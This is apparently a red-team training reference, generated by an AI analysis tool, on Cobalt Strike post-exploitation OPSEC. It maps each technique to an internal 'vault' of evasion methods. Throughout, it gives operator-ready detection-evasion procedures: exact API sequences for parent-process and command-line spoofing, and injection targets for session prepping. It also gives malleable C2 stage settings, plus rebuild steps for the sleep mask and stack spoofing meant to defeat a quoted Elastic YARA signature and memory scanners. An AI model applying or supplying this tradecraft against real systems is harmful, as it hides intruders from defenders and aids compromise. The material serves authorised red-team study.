---
id: RTO-cs-postex-opsec
name: Cobalt Strike Post-Exploitation OPSEC
source: Red Team Ops / Zero-Point Security
category: evasion
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-005, T-013, T-015, T-016, T-020, T-023]
tags: [cobalt-strike, opsec, ppid-spoofing, arg-spoofing, sleep-mask, stack-spoofing, malleable-c2, session-prep, rwx, bof, spawnto]
---

# Cobalt Strike Post-Exploitation OPSEC — Training Reference

## TL;DR
This module covers the detection footprint of Cobalt Strike's four categories of post-exploitation commands (House-Keeping, API Only, Inline/BOF, Fork-and-Run) and operator-grade OPSEC controls for each: `spawnto` binary selection, PPID spoofing, command-line argument spoofing via PEB manipulation, session prepping, RWX cleanup, Sleep Mask Kit customization, and thread stack spoofing via the Artifact Kit. The material is Cobalt Strike-centric but the underlying primitives (STARTUPINFOEX attribute lists, PEB `RTL_USER_PROCESS_PARAMETERS`, XOR sleep masking, Fiber-based stack trampolines) are directly portable to vault techniques T-015, T-016, and T-005.

## Key Concepts

1. **Four Command Categories Drive OPSEC Model.** CS post-ex commands fall into House-Keeping (no tasking), API Only (`cd`, `ls`, `make_token`), Inline BOF (`jump psexec`, `remote-exec psexec/wmi`), and Fork-and-Run (`execute-assembly`, `powerpick`, `mimikatz`). Each has a distinct detection surface — API-only leaves no child process; Fork-and-Run always spawns spawnto and injects a post-ex DLL captured over a named pipe. Knowing the category predicts the OPSEC footprint before execution.

2. **SpawnTo Is the Highest-Signal Fork-and-Run Telemetry Pivot.** Default CS spawnto is `rundll32.exe`, which Defender flags behaviorally — *not* via AMSI, so AMSI bypasses won't save you. Always override with `%windir%\sysnative\notepad.exe` or a contextually plausible binary at runtime (`spawnto x64 ...`) or in the `post-ex {}` block of the malleable C2 profile. Never reference `%windir%\system32\` directly — it resolves differently under WOW64.

3. **PPID Spoofing via STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.** The caller passes a handle (with `PROCESS_CREATE_PROCESS` access) via `UpdateProcThreadAttribute` and the `EXTENDED_STARTUPINFO_PRESENT` flag to `CreateProcess`. Sysmon logs the spoofed parent in Event ID 1. CS exposes this as the `ppid <PID>` command, affecting `shell`, `run`, `execute-assembly`, `shspawn`, etc. — but *not* `runu/spawnu/runas/spawnas` or post-ex jobs. Maps directly to vault **T-015**.

4. **Command-Line Spoofing via PEB Patching.** Create the process `CREATE_SUSPENDED` with fake args → `NtQueryInformationProcess(ProcessBasicInformation)` → `ReadProcessMemory` PEB → read `RTL_USER_PROCESS_PARAMETERS` → `WriteProcessMemory` into `CommandLine.Buffer` → `ResumeThread`. Critical gotcha: the `UNICODE_STRING.Length` field is *not* updated, so Process Hacker / Process Explorer truncate display to the original length — fake args must be ≥ real args in length, or strategically truncated to mislead. CS exposes this via `argue [command] [fake-args]`. Maps to vault **T-016** arg-spoofing primitive.

5. **Session Prepping Is Post-Landing OPSEC Hygiene.** After initial compromise or lateral movement (e.g., `jump psexec64` lands in `rundll32` in Session 0, orphaned from any service parent), inject into a contextually appropriate process before further action. For user-space operation: `inject <PID> x64 smb` into the user's `explorer.exe`. For SYSTEM/Session 0 persistence: target a third-party service worker (e.g., `amazon-ssm-agent.exe` → `ssm-agent-worker.exe`) because protected Windows core processes (svchost, services) reject handle opens even from SYSTEM. Set spawnto to match the host's normal child process lineage.

6. **RWX + Dangling Loader Region Is the Default OPSEC Hole.** CS's reflective loader allocates a RWX region for the Beacon payload and leaves the loader's RX region dangling post-execution. Two fixes in the `stage {}` block: `set userwx "false"` (forces RW → RX flip) and `set cleanup "true"` (frees the loader region). Also configurable: `set allocator` between `HeapAlloc` (default), `MapViewOfFile`, `VirtualAlloc`.

7. **Sleep Mask = XOR-Based Section Walking Pre-Sleep.** Beacon walks its own sections + heap allocations, XORs each byte with a 13-byte random key, sleeps, then restores on wake. Vulnerable to Elastic's published YARA rule targeting the deobfuscation routine signature (`4C 8B 53 08 45 8B 0A 45 8B 5A 04 ...`). The Sleep Mask Kit (Arsenal Kit) lets operators replace the default `sleepmask.c`/`sleepmask_smb.c`/`sleepmask_tcp.c` with custom logic — compiled output must stay under **769 bytes**. Complements `strrep` transforms (e.g., `strrep "beacon.x64.dll" "data.dll"`) but `strrep` alone breaks under sleep time = 0 because Beacon deobfuscates to check in. Maps to vault **T-005** Ekko ROP Sleep — a strictly more advanced ROP-chain-based sleep obfuscation.

8. **Thread Stack Spoofing via Fiber Trampoline.** Default Beacon thread call stack shows `SleepEx` → raw heap address → raw heap address, immediately betraying shellcode origin. Artifact Kit's stack-spoof implementation hooks Beacon's sleep function, installs a trampoline that zeros the return address, and uses `CreateFiber`/`SwitchToFiber`/`DeleteFiber` to execute `WaitForSingleObject` as alternate work — preventing stack walks from reaching shellcode. Source at `arsenal-kit/kits/artifact/src-common/spoof.c`. Vault **T-016** implements both basic and advanced multi-frame stack spoofing beyond this Fiber-based approach.

9. **String Replacement Footguns.** Naively replacing every string breaks Beacon's internal HTTP server (used by `powershell-import` / `powerpick` to fetch scripts from `http://127.0.0.1:<port>/`). Replacing `HTTP/1.1 200 OK` causes `DownloadString` protocol violations. Apply `strrep` surgically, not broadly.

## Operational Techniques

### SpawnTo Configuration
- **What**: Override the binary CS uses for Fork-and-Run post-ex process spawning.
- **When to use**: Always — default `rundll32.exe` is a behavioral Defender kill. Apply at session start, on every new Beacon, especially after lateral movement.
- **How**:
  - Runtime: `beacon> spawnto x64 %windir%\sysnative\notepad.exe` and `beacon> spawnto x86 %windir%\syswow64\notepad.exe`
  - Profile: in `post-ex { set spawnto_x86 "..."; set spawnto_x64 "..."; }`
  - Use `%windir%\sysnative\` (NOT `%windir%\system32\`) to avoid WOW64 path ambiguity.
  - Pick a binary contextually plausible for the Beacon host — match the user's normal workflow (e.g., browser binary if Beacon is in a browser).
- **Vault link**: No direct equivalent — vault is framework-agnostic. The principle (pick spawnto to match host context) applies to vault injection chain `target_process` selection in **T-013** injection methods.
- **Tool/code**: `spawnto [x86|x64] [path]` Beacon command; `post-ex {}` malleable C2 block.
- **OPSEC**: Defenders key on `rundll32.exe` child of unusual parent (Office, PowerShell, browser). Switch to notepad/wermgr/conhost as appropriate. Avoid third-party binaries that may have their own telemetry hooks.

### PPID Spoofing
- **What**: Spawn a process with a parent other than the caller via `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.
- **When to use**: Beacon is running in an unusual process (initial compromise, lateral movement, exploit delivery); process-creation events from this Beacon would trip alerts.
- **How**:
  1. Allocate `STARTUPINFOEX sie = { sizeof(sie) }`.
  2. `InitializeProcThreadAttributeList(NULL, 1, 0, &lpSize)` — returns FALSE but populates size.
  3. `sie.lpAttributeList = malloc(lpSize)`.
  4. `InitializeProcThreadAttributeList(sie.lpAttributeList, 1, 0, &lpSize)` — returns TRUE.
  5. `HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid)` — target must grant `PROCESS_CREATE_PROCESS`.
  6. `UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)`.
  7. `CreateProcess(..., EXTENDED_STARTUPINFO_PRESENT, ..., &sie.StartupInfo, &pi)`.
  8. Cleanup: `DeleteProcThreadAttributeList(sie.lpAttributeList)`.
  - CS: `beacon> ppid 2704` (sets for all post-ex spawns); `beacon> ppid` (reset to self).
- **Vault link**: **T-015 PPID Spoofing** — vault implements the same primitive; cross-reference for Rust FFI bindings and `windows_targets::link!` patterns. CS `ppid` does NOT affect `runu/spawnu/runas/spawnas` or post-ex jobs — vault T-015 has no such scoping limitation when used directly.
- **Tool/code**: Win32 APIs: `InitializeProcThreadAttributeList`, `UpdateProcThreadAttribute`, `DeleteProcThreadAttributeList`, `CreateProcessW` with `EXTENDED_STARTUPINFO_PRESENT`. Required struct: `STARTUPINFOEXW`, `PROC_THREAD_ATTRIBUTE_LIST`.
- **OPSEC**: Sysmon EID 1 records the spoofed parent — pick a parent that legitimately spawns children (e.g., `explorer.exe` for user processes, `services.exe` for service-like behavior). A spoofed `svchost.exe` parent without matching service context is itself suspicious. The caller still needs a handle to the parent — opening PPL-protected processes fails even as SYSTEM.

### Command-Line Argument Spoofing
- **What**: Start a process with fake logged args, then overwrite the real args in the PEB before resume.
- **When to use**: Need to run a command-line tool (cmd, powershell, whoami) without the true args appearing in Sysmon EID 1 / EDR telemetry.
- **How**:
  1. `CreateProcess(L"path", L"fake args", ..., CREATE_SUSPENDED, ..., &si, &pi)`.
  2. `GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess")`.
  3. `NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &length)`.
  4. `ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), &bytesRead)`.
  5. `ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &rtlParams, sizeof(RTL_USER_PROCESS_PARAMETERS), &bytesRead)`.
  6. `WriteProcessMemory(pi.hProcess, rtlParams.CommandLine.Buffer, newArgs, sizeof(newArgs), &bytesWritten)`.
  7. `ResumeThread(pi.hThread)`.
  - Gotcha: `UNICODE_STRING.Length` is *not* updated — fake args must be ≥ real args, or truncate strategically.
  - CS: `beacon> argue [command] [fake arguments]` (does not affect `runu/spawnu/runas/spawnas` or post-ex jobs). List with bare `argue`; disable per-command with `argue [command]`.
- **Vault link**: **T-016 EDR Evasion Suite** — vault implements arg spoofing as a first-class evasion primitive. The training's manual PEB-walk approach is the canonical reference implementation; vault T-016 wraps it behind a Rust API. The training's note that CS `argue` does not adjust `Length` matches the manual procedure — fake args must be longer.
- **Tool/code**: `NtQueryInformationProcess` typedef, `PROCESS_BASIC_INFORMATION`, `PEB`, `RTL_USER_PROCESS_PARAMETERS`, `ReadProcessMemory`/`WriteProcessMemory`. CS command: `argue`.
- **OPSEC**: Not a silver bullet — process creation events for child processes (e.g., `whoami.exe` spawned by spoofed cmd) still fire. Most effective on commands that don't spawn additional processes. `ProcessHacker`/`ProcessExplorer` re-read PEB on inspect — point-in-time tools will show real args if inspected post-resume.

### Session Prepping
- **What**: Post-landing injection into a contextually plausible host process before further post-ex action.
- **When to use**: After `jump psexec64` (lands in `rundll32` Session 0, orphaned), `jump winrm64` (lands in PowerShell), or any lateral movement that leaves Beacon in a detectable host.
- **How**:
  - **User-space strategy**: `inject <explorer PID> x64 smb` → `exit` SYSTEM Beacon → `link` to user Beacon from initial chain. Drop from high to medium integrity if acceptable. Set spawnto to a user-context binary.
  - **SYSTEM/Session 0 strategy**: enumerate `sc query` for third-party services with `WIN32_OWN_PROCESS` and `LocalSystem` start name — these typically have lower protection than core Windows processes. Inject into the service exe, set spawnto to its worker binary (e.g., amazon-ssm-agent → ssm-agent-worker).
  - Don't attempt to inject into PPL-protected Windows core (svchost, services, lsass) — handle open fails with error 5 even as SYSTEM.
- **Vault link**: **T-013 Remaining Injection Methods** + **T-014 NtCreateUserProcess** — vault injection techniques are the underlying primitive; the training's value is the *operational decision tree* for picking targets, not the injection mechanism. Vault **T-023 Client Capabilities** covers recon enumeration that would feed this decision.
- **Tool/code**: `beacon> inject <PID> <arch> <transport>`; `beacon> link <IP>`; `sc query` / `sc qc <service>` for enumeration; `beacon> getuid`; `beacon> ppid` (reset); `beacon> spawnto [x86|x64] [path]`.
- **OPSEC: Worst-case scenario is Beacon sitting in orphaned rundll32 in Session 0 with no service parent — this is a tripwire. Inject before any further action. Third-party service workers (amazon-ssm-agent, CrowdStrike, etc.) blend better than Microsoft binaries because their spawning pattern is less codified in detection rules.

### RWX Memory Cleanup (Malleable C2 `stage` Block)
- **What**: Force Beacon's reflective loader to RW→RX flip and free the loader region after execution.
- **When to use**: Always — RWX regions are a memory-scanner tripwire and the dangling loader region is a signature.
- **How**:
  ```
  stage {
      set userwx "false";        # RW then flip to RX (instead of RWX)
      set cleanup "true";        # Free the loader region after exec
      # Optional: set allocator "VirtualAlloc" | "MapViewOfFile" | "HeapAlloc"
  }
  ```
  After change, regenerate shellcode — already-running Beacons are unaffected.
- **Vault link**: **T-016 EDR Evasion Suite** covers equivalent memory hygiene primitives (PE stomping, PE header stomping). Vault **T-005 Ekko ROP Sleep** performs more aggressive memory encryption during sleep, superseding the simple RW→RX approach.
- **Tool/code**: Malleable C2 `stage {}` block directives: `userwx`, `cleanup`, `allocator`.
- **OPSEC**: Inspect with Process Hacker memory tab — expect to see Beacon split across three regions: header (RW), main Beacon (RX), everything else (RW). No RWX. No dangling loader region.

### Sleep Mask Kit Customization
- **What**: Replace the default XOR-with-13-byte-key sleep obfuscation with custom logic to break static YARA signatures.
- **When to use**: When Elastic's `beacon_default_sleep_mask` YARA rule (signature: `4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03` for x64) detects Beacon even while sleeping.
- **How**:
  1. `cd ~/cobaltstrike/arsenal-kit/kits/sleepmask`
  2. Edit `src/sleepmask.c` (HTTP/HTTPS/DNS), `sleepmask_smb.c`, or `sleepmask_tcp.c`.
  3. Key struct: `SLEEPMASKP { char *beacon_ptr; DWORD *sections; HEAP_RECORD *heap_records; char mask[MASK_SIZE]; }`.
  4. Entry point: `void sleep_mask(SLEEPMASKP * parms, void(__stdcall *pSleep)(DWORD), DWORD time)` — walk sections/heap, XOR each byte with `mask`, call `pSleep`, restore.
  5. Custom logic must compile to < **769 bytes**.
  6. `sudo ./build.sh /tmp/sleepmask` — *note*: build script runs `rm -rf` on output dir, don't use a path you care about.
  7. Output: `sleepmask.x86.o`, `sleepmask.x64.o`, `sleepmask_smb.{x86,x64}.o`, `sleepmask_tcp.{x86,x64}.o`, `sleepmask.cna`.
  8. Copy to Windows attacker, load `sleepmask.cna` via Cobalt Strike → Script Manager → Load.
  9. Generate *new* Beacon payload — already-running Beacons don't pick up the new mask.
  10. Verify: `yara64.exe -s beacon-default-sleep-mask.yara <PID>` should return no matches.
  - Combine with `strrep` in `transform-x64 {}` block — but never `strrep "HTTP/1.1 200 OK" ""` (breaks `powershell-import`).
  - Don't run with sleep time = 0 — Beacon deobfuscates to check in and is exposed.
- **Vault link**: **T-005 Ekko ROP Sleep** — vault implements a 6-frame ROP chain that performs actual PE encryption (not XOR), significantly more resistant to YARA and memory scanning. CS Sleep Mask is a primitive XOR walk; Ekko ROP is the modern successor. Operators using the vault framework should prefer T-005 over CS Sleep Mask Kit. The CS Sleep Mask approach is still useful when operating within CS-only engagements or against defenders without ROP-chain detection.
- **Tool/code**: YARA reference rules (`beacon_strings`, `beacon_default_sleep_mask`); `yara64.exe -s <rule> <PID>`; `strings beacon.bin`; Process Hacker memory tab.
- **OPSEC**: Even with custom mask, sleep time = 0 is fatal — Beacon is exposed during check-in. Use sleep ≥ 30s. The mask only obfuscates *while sleeping*, not while executing — don't queue long-running jobs and expect stealth.

### Thread Stack Spoofing (Artifact Kit)
- **What**: Replace raw shellcode addresses on the Beacon main thread call stack with Fiber-mediated execution to defeat stack-walking scanners.
- **When to use**: When memory scanners walk thread stacks looking for return addresses in non-image-backed memory (the Beacon payload region).
- **How**:
  1. Build Artifact Kit with stack-spoof option: `./build.sh pipe VirtualAlloc 271360 5 true true /tmp/dist` (the first `true` is stack spoof).
  2. Copy artifacts to Windows attacker VM.
  3. Load the CNA via Script Manager.
  4. Generate new payload using the custom artifact.
  5. Verify in Process Hacker: thread call stack should no longer show raw heap addresses; the `SleepEx` → raw_addr → raw_addr pattern is broken.
  - Mechanism: hooks Beacon's sleep function, installs a trampoline that zeroes the return address, uses `CreateFiber` / `SwitchToFiber` / `DeleteFiber` to execute `WaitForSingleObject` as alternate work unit.
  - Source: `arsenal-kit/kits/artifact/src-common/spoof.c`.
- **Vault link**: **T-016 EDR Evasion Suite** — vault implements both basic and advanced multi-frame call stack spoofing. The Fiber-based Artifact Kit approach is a single-frame hook + trampoline; vault T-016's advanced multi-frame variant produces a more legitimate-looking call chain (multiple fake frames mimicking natural call stacks). Operators using the vault framework get stronger stack spoofing than CS Artifact Kit provides. Also intersects with **T-013** (Fiber injection / Fiber-based execution) — vault has Fiber primitives for both injection and stack spoof.
- **Tool/code**: Artifact Kit build script with stack-spoof flag; Fiber APIs: `CreateFiber`, `SwitchToFiber`, `DeleteFiber`. Source file: `spoof.c`.
- **OPSEC**: Verification: open Process Hacker → Threads tab → main thread → Call Stack. Pre-spoof shows `KernelBase.dll!SleepEx` → `<heap address>` → `<heap address>` (cross-reference to Beacon region via Memory tab). Post-spoof should show no raw heap addresses. The trampoline zeroes return address — EDRs walking the stack will hit nulls and stop, missing the shellcode origin.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `spawnto [x86\|x64] [path]` | Set Fork-and-Run spawnto binary at runtime | Use `%windir%\sysnative\` not `system32\`; default rundll32 is Defender kill |
| `post-ex { set spawnto_x86/x64 ... }` | Set default spawnto in C2 profile | Persisted across all new Beacons |
| `ppid <PID>` | Spoof parent for all post-ex spawns | Target must grant PROCESS_CREATE_PROCESS; doesn't affect runu/spawnu/runas/spawnas |
| `ppid` (bare) | Reset PPID to self | Use after spoofed parent dies or context changes |
| `argue [cmd] [fake-args]` | Spoof command line for spawned processes | Fake args must be ≥ real args (UNICODE_STRING.Length not updated) |
| `argue [cmd]` (single) | Disable spoofing for that command | |
| `argue` (bare) | List active spoof mappings | |
| `inject <PID> <arch> <transport>` | Inject into running process (session prepping) | PPL-protected processes fail even as SYSTEM |
| `link <IP>` | Chain Beacon to injected child | Used after inject to migrate session |
| `stage { set userwx "false"; set cleanup "true"; }` | RW→RX flip + free loader region | Only affects new Beacons |
| `stage { set allocator "..." }` | Switch allocator (HeapAlloc default, MapViewOfFile, VirtualAlloc) | Useful if HeapAlloc-based loader detected |
| `transform-x64 { strrep "X" "Y"; }` | String replacement in reflective DLL | Don't replace `HTTP/1.1 200 OK` — breaks powershell-import |
| `stage { set sleep_mask "true"; }` | Enable default XOR sleep mask | 13-byte key; vulnerable to Elastic YARA rule |
| Sleep Mask Kit (`build.sh /tmp/sleepmask`) | Custom sleep mask logic | Output must be < 769 bytes; build script `rm -rf` output dir |
| `sleepmask.c` / `sleepmask_smb.c` / `sleepmask_tcp.c` | Sleep mask source files | One per Beacon transport type |
| Artifact Kit (`build.sh pipe VirtualAlloc 271360 5 true true /tmp/dist`) | Custom artifacts with stack spoof | `true` flag toggles stack spoof; produces .cna + binaries |
| `spoof.c` (arsenal-kit artifact src-common) | Stack spoof source | Fiber-based trampoline; zeroes return address |
| `yara64.exe -s <rule.yara> <PID>` | YARA process memory scan | Use to validate evasion before deployment |
| `strings beacon.bin` | Extract strings from Beacon payload | Use to author custom YARA rules for self-testing |
| Process Hacker → Memory tab | Inspect regions, RWX detection | Re-reads PEB on each open — point-in-time |
| Process Hacker → Threads → Call Stack | Inspect thread call stacks | Raw heap addresses in stack = shellcode indicator |
| `sc query` / `sc qc <service>` | Enumerate services for session prepping targets | Look for `WIN32_OWN_PROCESS`, `LocalSystem`, non-PPL |

## Gaps & Extensions

### What the vault covers that this training does NOT

- **Modern indirect syscall dispatch** (T-001 RecycledGate, T-002 Hell's/Halo's/Tartarus Gate, T-003 VEH Gate) — training is entirely Win32-API based (CreateProcess, NtQueryInformationProcess). Vault has 4-stage SSN resolution cascade that defeats EDR hooks entirely.
- **Advanced sleep obfuscation** (T-005 Ekko ROP Sleep) — 6-frame ROP chain that performs real PE encryption, not simple XOR. The CS Sleep Mask Kit's 769-byte limit constrains creativity; Ekko has no such limit.
- **Modern process injection methods** (T-007 Pool Party, T-008 Threadless, T-009 Ghosting, T-010 Herpaderping, T-011 Dirty Vanity, T-012 Early Cascade) — training's `inject` command uses standard CreateRemoteThread-style injection; vault has thread pool manipulation, export hijack, delete-pending file execution, process reflection, pre-LdrInitializeThunk APC. Operators should prefer vault injection methods over CS default.
- **Multi-frame stack spoofing** (T-016 advanced) — training's Artifact Kit approach is single-frame Fiber trampoline; vault produces legitimate-looking multi-frame call chains.
- **AMSI/ETW bypass via HW breakpoints** (T-016 amsi_hbp.rs) — training explicitly notes AMSI bypasses don't circumvent the behavioral Defender kill of spawnto=rundll32. Vault has HW-breakpoint-based AMSI bypass that is signature-resistant.
- **PEB walker for manual module resolution** (T-004) — training uses `GetModuleHandle`/`GetProcAddress`; vault resolves via `gs:[0x60]` → PEB walk → DJB2 hash, avoiding IAT entries.
- **Persistence suite, anti-analysis, crypto, networking, BYOVD** — all out of scope for this training module.

### What this training covers that the vault does NOT

- **Operational decision tree for session prepping** — vault has injection methods but not the *target selection* tradecraft (when to go user-space vs Session 0, when to inject into third-party service workers vs Windows core, when to drop integrity level). This is pure operational knowledge that complements vault T-013/T-014/T-023.
- **Cobalt Strike malleable C2 profile specifics** — `stage { userwx, cleanup, allocator, sleep_mask }`, `transform-x64 { strrep }`, `post-ex { spawnto_x86/x64 }`. Vault is CS-agnostic; this is essential when operating within CS-only engagements.
- **YARA-as-validation methodology** — the workflow of authoring YARA rules against your own Beacon strings (`strings beacon.bin` → `yara64.exe -s rule <PID>`), including the Elastic `beacon_default_sleep_mask` reference signature. Vault T-020 has a diagnostic test harness but does not cover YARA self-validation against memory scanners.
- **`strrep` footgun catalog** — the specific gotchas like `HTTP/1.1 200 OK` breaking `powershell-import`. This is hard-won tradecraft not derivable from first principles.
- **UNICODE_STRING.Length truncation as a feature** — exploiting the fact that Process Hacker/Process Explorer only read up to `Length` bytes, intentionally truncating the spoofed args to mislead. Vault T-016 arg spoofing does not document this nuance.
- **SpawnTo as a behavioral Defender bypass** — the specific note that AMSI bypasses do *not* circumvent the spawnto=rundll32 behavioral kill. Important context for CS operators who might assume AMSI patch = safe.
- **Arsenal Kit build script OPSEC** — the `rm -rf` on output directory gotcha, the 769-byte compiled limit, the `mingw` recompilation step. Operational knowledge not in vault.

### Outdated or superseded content

- The CS Sleep Mask's default XOR-with-13-byte-key is **directly detected** by Elastic's published YARA rule (`beacon_default_sleep_mask`). Vault **T-005 Ekko ROP Sleep** supersedes this approach — operators with access to the vault framework should use Ekko instead.
- The Artifact Kit's Fiber-based stack spoofing is **less capable** than vault **T-016** advanced multi-frame stack spoofing. The single-frame trampoline that zeroes the return address is itself a detectable pattern; multi-frame fake call chains are more resilient.
- The training's `argue` command limitation (no adjustment of `UNICODE_STRING.Length`) is **CS-specific** — vault T-016 arg spoofing does not have this limitation when used directly via the Rust API.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| `spawnto` binary override | (no direct card) | Vault is framework-agnostic; principle informs target_process selection in T-013/T-014 |
| PPID spoofing via STARTUPINFOEX | T-015 PPID Spoofing | Direct equivalent — vault has Rust FFI bindings, no CS scoping limitations |
| Command-line spoofing via PEB patch | T-016 EDR Evasion Suite (arg spoofing) | Vault wraps same primitive; training's manual PEB walk is reference impl |
| `UNICODE_STRING.Length` truncation | T-016 (arg spoofing) | Vault does not document this nuance; training adds operator insight |
| Session prepping (target selection) | T-013 Remaining Methods, T-023 Client Capabilities | Vault has injection + recon primitives; training adds the decision tree |
| RWX cleanup (`userwx=false`, `cleanup=true`) | T-016 (PE stomping, PE header stomping) | Vault has more aggressive memory hygiene; CS stage block is simpler equivalent |
| Sleep Mask Kit (XOR walk) | T-005 Ekko ROP Sleep | **Vault supersedes** — Ekko's ROP-chain PE encryption is strictly more advanced than 13-byte XOR |
| Elastic YARA rule for sleep mask | (validation methodology) | Vault T-020 has diagnostic test harness but no YARA self-validation workflow |
| Thread stack spoofing (Fiber trampoline) | T-016 (basic + advanced multi-frame stack spoofing) | **Vault supersedes** — multi-frame approach more resilient than single-frame trampoline |
| `strrep` string replacement | T-020 (IAT camouflage, string obfuscation proc macro) | Different mechanism (runtime PEB string replace vs compile-time proc macro); both useful |
| `argue` command | T-016 (arg spoofing) | Same primitive, CS exposes subset of functionality |
| Inline BOF execution | T-023 (BOF execution) | Vault has BOF execution capability; CS BOF model is the reference |
| Fork-and-Run (DLL inject + named pipe) | T-013 (process hollowing, module overloading) | Different mechanism — CS uses temp process + post-ex DLL; vault injects into existing process |
| `inject` Beacon command | T-013 (multiple methods), T-014 (NtCreateUserProcess) | Vault has 15 injection methods; CS `inject` is one specific implementation |
| `jump psexec64` (lands in spawnto, Session 0) | T-015 (PPID spoofing) | Training's session prepping is the OPSEC response; vault T-015 is the underlying primitive |
| `transform-x64 strrep` footguns | (no direct card) | Training-only operational knowledge — `HTTP/1.1 200 OK` breakage not documented elsewhere |
| Artifact Kit build script | (no direct card) | CS-specific build pipeline; vault uses Cargo features instead |